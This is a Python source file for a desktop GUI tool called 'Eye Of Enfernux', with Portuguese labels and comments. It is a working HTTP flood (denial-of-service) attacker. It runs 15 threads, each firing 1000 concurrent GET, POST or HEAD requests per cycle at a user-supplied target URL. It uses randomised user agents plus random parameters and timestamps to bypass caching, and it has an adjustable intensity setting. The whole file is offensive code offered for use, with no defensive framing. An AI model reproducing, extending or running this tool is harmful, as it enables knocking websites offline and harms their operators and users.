import asyncio
import aiohttp
import tkinter as tk
from tkinter import ttk, messagebox
import logging
import random
import threading
import time

# Configuração de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class EyeOfEnfernux:
    def __init__(self, root):
        self.root = root
        self.root.title("Eye Of Enfernux")
        self.root.geometry("800x600")

        # Estilo para o tema vermelho escuro e preto ônix
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TFrame', background='#111', foreground='#8B0000')
        self.style.configure('TLabel', background='#111', foreground='#8B0000')
        self.style.configure('TButton', background='#222', foreground='#8B0000')
        self.style.configure('TEntry', fieldbackground='#222', foreground='#8B0000', insertcolor='#8B0000')
        self.style.configure('TCheckbutton', background='#111', foreground='#8B0000')
        self.style.configure('TRadiobutton', background='#111', foreground='#8B0000')
        self.style.configure('TCombobox', fieldbackground='#222', foreground='#8B0000')

        # Variáveis
        self.target_url = tk.StringVar()
        self.num_connections = tk.IntVar(value=1000)  # Aumentado para 1000 conexões padrão
        self.request_type = tk.StringVar(value="GET")
        self.data_payload = tk.StringVar()
        self.user_agent = tk.StringVar(value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        self.running = False
        self.flood_intensity = tk.IntVar(value=3)  # Nova variável para intensidade do flood (1-5)
        
        # Estatísticas
        self.request_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.last_update_time = time.time()
        self.requests_per_second = 0
        
        # Threads e loops
        self.attack_threads = []
        self.max_threads = 15  # Número de threads de ataque paralelos
        
        self.create_widgets()
        
        # Inicializa o loop de atualização de estatísticas
        self.update_stats()

    def create_widgets(self):
        # Notebook para organizar as abas
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Aba de Configurações Básicas
        self.basic_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.basic_tab, text="Básico")
        self.create_basic_tab()

        # Aba de Configurações Avançadas
        self.advanced_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.advanced_tab, text="Avançado")
        self.create_advanced_tab()

        # Aba de Status
        self.status_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.status_tab, text="Status")
        self.create_status_tab()

    def create_basic_tab(self):
        basic_frame = ttk.Frame(self.basic_tab, padding="20")
        basic_frame.pack(fill=tk.BOTH, expand=True)

        # URL Alvo
        ttk.Label(basic_frame, text="URL Alvo:").grid(row=0, column=0, sticky=tk.W, pady=(5, 0))
        target_entry = ttk.Entry(basic_frame, textvariable=self.target_url, width=50)
        target_entry.grid(row=1, column=0, sticky=tk.EW, pady=(0, 10), columnspan=2)

        # Número de Conexões
        ttk.Label(basic_frame, text="Número de Conexões por Ciclo:").grid(row=2, column=0, sticky=tk.W, pady=(5, 0))
        connections_entry = ttk.Entry(basic_frame, textvariable=self.num_connections, width=10)
        connections_entry.grid(row=3, column=0, sticky=tk.W, pady=(0, 10))
        
        # Intensidade do Flood
        ttk.Label(basic_frame, text="Intensidade do Flood (1-5):").grid(row=2, column=1, sticky=tk.W, pady=(5, 0))
        intensity_scale = ttk.Scale(basic_frame, from_=1, to=5, orient=tk.HORIZONTAL, 
                                   variable=self.flood_intensity, length=150)
        intensity_scale.grid(row=3, column=1, sticky=tk.W, pady=(0, 10))

        # Botão Iniciar
        start_button = ttk.Button(basic_frame, text="Iniciar Flood HTTP", command=self.start_attack)
        start_button.grid(row=4, column=0, pady=20)

        # Botão Parar
        stop_button = ttk.Button(basic_frame, text="Parar Flood HTTP", command=self.stop_attack)
        stop_button.grid(row=4, column=1, pady=20)

    def create_advanced_tab(self):
        advanced_frame = ttk.Frame(self.advanced_tab, padding="20")
        advanced_frame.pack(fill=tk.BOTH, expand=True)

        # Tipo de Requisição
        ttk.Label(advanced_frame, text="Tipo de Requisição:").grid(row=0, column=0, sticky=tk.W, pady=(5, 0))
        request_type_combo = ttk.Combobox(advanced_frame, textvariable=self.request_type, 
                                         values=["GET", "POST", "HEAD"])
        request_type_combo.grid(row=1, column=0, sticky=tk.EW, pady=(0, 10), columnspan=2)

        # User Agent
        ttk.Label(advanced_frame, text="User Agent:").grid(row=2, column=0, sticky=tk.W, pady=(5, 0))
        user_agent_entry = ttk.Entry(advanced_frame, textvariable=self.user_agent, width=50)
        user_agent_entry.grid(row=3, column=0, sticky=tk.EW, pady=(0, 10), columnspan=2)

        # Data Payload (para requisições POST)
        ttk.Label(advanced_frame, text="Data Payload (JSON):").grid(row=4, column=0, sticky=tk.W, pady=(5, 0))
        data_payload_entry = ttk.Entry(advanced_frame, textvariable=self.data_payload, width=50)
        data_payload_entry.grid(row=5, column=0, sticky=tk.EW, pady=(0, 10), columnspan=2)
        
        # Checkbox para randomizar User-Agent
        self.randomize_ua = tk.BooleanVar(value=True)
        ua_check = ttk.Checkbutton(advanced_frame, text="Randomizar User-Agent", variable=self.randomize_ua)
        ua_check.grid(row=6, column=0, sticky=tk.W, pady=(5, 0))
        
        # Checkbox para randomizar parâmetros na URL
        self.randomize_params = tk.BooleanVar(value=True)
        params_check = ttk.Checkbutton(advanced_frame, text="Adicionar parâmetros randômicos na URL", 
                                      variable=self.randomize_params)
        params_check.grid(row=7, column=0, sticky=tk.W, pady=(5, 0))

    def create_status_tab(self):
        status_frame = ttk.Frame(self.status_tab, padding="20")
        status_frame.pack(fill=tk.BOTH, expand=True)

        # Estatísticas
        stats_frame = ttk.Frame(status_frame)
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Labels para estatísticas
        ttk.Label(stats_frame, text="Estatísticas em Tempo Real:").grid(row=0, column=0, sticky=tk.W, columnspan=2)
        
        ttk.Label(stats_frame, text="Requisições/segundo:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.rps_label = ttk.Label(stats_frame, text="0")
        self.rps_label.grid(row=1, column=1, sticky=tk.W, pady=2)
        
        ttk.Label(stats_frame, text="Total de Requisições:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.total_req_label = ttk.Label(stats_frame, text="0")
        self.total_req_label.grid(row=2, column=1, sticky=tk.W, pady=2)
        
        ttk.Label(stats_frame, text="Sucessos:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.success_label = ttk.Label(stats_frame, text="0")
        self.success_label.grid(row=3, column=1, sticky=tk.W, pady=2)
        
        ttk.Label(stats_frame, text="Falhas:").grid(row=4, column=0, sticky=tk.W, pady=2)
        self.fail_label = ttk.Label(stats_frame, text="0")
        self.fail_label.grid(row=4, column=1, sticky=tk.W, pady=2)

        # Área de texto para exibir o status
        self.status_text = tk.Text(status_frame, height=16, width=70, bg="#222", fg="#8B0000")
        self.status_text.pack(fill=tk.BOTH, expand=True)

    def get_random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/97.0.1072.62",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
        ]
        return random.choice(user_agents)

    def add_random_params(self, url):
        if '?' not in url:
            url += '?'
        else:
            url += '&'
        
        # Adiciona 1-3 parâmetros aleatórios
        for _ in range(random.randint(1, 3)):
            param = f"p{random.randint(1000, 9999)}={random.randint(10000, 99999)}"
            url += param + '&'
        
        # Remove o último '&'
        return url[:-1]

    async def send_request(self, session, url, request_type, data_payload, headers):
        try:
            # Definindo timeout curto para requisições mais rápidas
            timeout = aiohttp.ClientTimeout(total=2)
            
            if request_type == "GET":
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as response:
                    self.request_count += 1
                    if response.status < 400:
                        self.success_count += 1
                    else:
                        self.fail_count += 1
            
            elif request_type == "POST":
                async with session.post(url, data=data_payload, headers=headers, timeout=timeout, ssl=False) as response:
                    self.request_count += 1
                    if response.status < 400:
                        self.success_count += 1
                    else:
                        self.fail_count += 1
            
            elif request_type == "HEAD":
                async with session.head(url, headers=headers, timeout=timeout, ssl=False) as response:
                    self.request_count += 1
                    if response.status < 400:
                        self.success_count += 1
                    else:
                        self.fail_count += 1
            
            return True
        
        except Exception:
            self.request_count += 1
            self.fail_count += 1
            return False

    async def flood_worker(self):
        base_url = self.target_url.get()
        request_type = self.request_type.get()
        data_payload = self.data_payload.get()
        base_user_agent = self.user_agent.get() or "Mozilla/5.0"
        
        # Determina a intensidade do flood (afeta timeouts e configurações)
        intensity = self.flood_intensity.get()
        
        # Configura o conector com base na intensidade
        max_connections = 0  # 0 = sem limite
        
        # Configura o cliente HTTP para alto desempenho
        connector = aiohttp.TCPConnector(
            limit=max_connections,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=False,
            ssl=False
        )
        
        # Reduzir o timeout com base na intensidade
        timeout = aiohttp.ClientTimeout(total=5 - intensity + 0.5)
        
        # Criar sessão otimizada para alta velocidade
        client_session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            raise_for_status=False,
            auto_decompress=False  # Desativa decompressão para melhorar velocidade
        )
        
        try:
            # Mantém o worker rodando enquanto o ataque estiver ativo
            while self.running:
                tasks = []
                
                # Determina o número de requisições simultâneas
                connections = self.num_connections.get()
                
                for _ in range(connections):
                    # Prepara a URL (adiciona parâmetros aleatórios se necessário)
                    url = base_url
                    if self.randomize_params.get():
                        url = self.add_random_params(url)
                    
                    # Prepara o User-Agent
                    user_agent = base_user_agent
                    if self.randomize_ua.get():
                        user_agent = self.get_random_user_agent()
                    
                    # Prepara os cabeçalhos
                    headers = {
                        'User-Agent': user_agent,
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Connection': 'keep-alive',
                        'Referer': url
                    }
                    
                    # Adiciona um timestamp para evitar caching
                    timestamp_param = f"t={int(time.time() * 1000)}"
                    if '?' in url:
                        url += f"&{timestamp_param}"
                    else:
                        url += f"?{timestamp_param}"
                    
                    # Adiciona a tarefa à lista
                    task = self.send_request(client_session, url, request_type, data_payload, headers)
                    tasks.append(task)
                
                # Executa todas as requisições simultaneamente
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # Intervalo mínimo (menor = mais rápido, mas pode travar)
                # Ajusta o intervalo com base na intensidade
                interval = max(0.001, 0.1 - (intensity * 0.02))
                await asyncio.sleep(interval)
                
        except Exception as e:
            self.log_status(f"Erro no worker de flood: {str(e)}")
        finally:
            # Fecha a sessão ao terminar
            await client_session.close()

    def attack_thread_function(self):
        # Configura o loop de eventos para o thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            # Executa o worker de flood
            loop.run_until_complete(self.flood_worker())
        except Exception as e:
            self.root.after(0, lambda: self.log_status(f"Erro no thread: {str(e)}"))
        finally:
            loop.close()

    def start_attack(self):
        if self.running:
            messagebox.showinfo("Aviso", "O flood já está em execução.")
            return
        
        target_url = self.target_url.get()
        if not target_url:
            messagebox.showerror("Erro", "Por favor, insira a URL alvo.")
            return
        
        # Reset estatísticas
        self.request_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.last_update_time = time.time()
        
        self.running = True
        self.log_status(f"Iniciando Flood HTTP com intensidade {self.flood_intensity.get()}/5...")
        
        # Inicia múltiplos threads de ataque
        self.attack_threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=self.attack_thread_function)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        self.log_status(f"Iniciados {self.max_threads} threads de ataque.")

    def stop_attack(self):
        if not self.running:
            messagebox.showinfo("Aviso", "Nenhum flood em execução.")
            return
        
        self.running = False
        self.log_status("Interrompendo Flood HTTP...")
        
        # Aguarda até 3 segundos para os threads terminarem
        for thread in self.attack_threads:
            thread.join(0.5)
        
        self.log_status(f"Flood interrompido. Estatísticas finais: {self.request_count} requisições totais")
        self.attack_threads = []

    def update_stats(self):
        if self.running:
            # Calcula requisições por segundo
            current_time = time.time()
            elapsed = current_time - self.last_update_time
            
            if elapsed >= 1.0:  # Atualiza a cada segundo
                self.requests_per_second = int(self.request_count / elapsed)
                self.last_update_time = current_time
                self.request_count = 0  # Reset para próxima medição
            
            # Atualiza os labels de estatísticas
            self.rps_label.config(text=str(self.requests_per_second))
            total = self.success_count + self.fail_count
            self.total_req_label.config(text=str(total))
            self.success_label.config(text=str(self.success_count))
            self.fail_label.config(text=str(self.fail_count))
        
        # Agenda a próxima atualização
        self.root.after(100, self.update_stats)

    def log_status(self, message):
        self.status_text.insert(tk.END, message + "\n")
        self.status_text.see(tk.END)
        
        # Limita o tamanho do log
        if int(self.status_text.index('end-1c').split('.')[0]) > 500:
            self.status_text.delete('1.0', '200.0')

if __name__ == "__main__":
    root = tk.Tk()
    gui = EyeOfEnfernux(root)
    root.mainloop()
